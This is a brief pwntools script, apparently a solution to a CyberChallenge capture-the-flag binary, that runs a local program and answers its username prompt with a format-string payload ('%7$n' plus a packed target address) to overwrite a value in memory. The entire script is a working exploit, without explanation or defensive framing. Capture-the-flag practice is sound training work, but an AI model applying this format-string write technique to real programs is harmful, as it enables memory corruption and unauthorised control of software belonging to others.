from pwn import *

# r = remote("cyberchallenge.disi.unitn.it", 9006)
r = process("./bin")

r.sendlineafter(
    b"username: ",
    b"   %7$n " + p64(0x000000000040408c)
)

print(r.recvall().decode(errors="ignore"))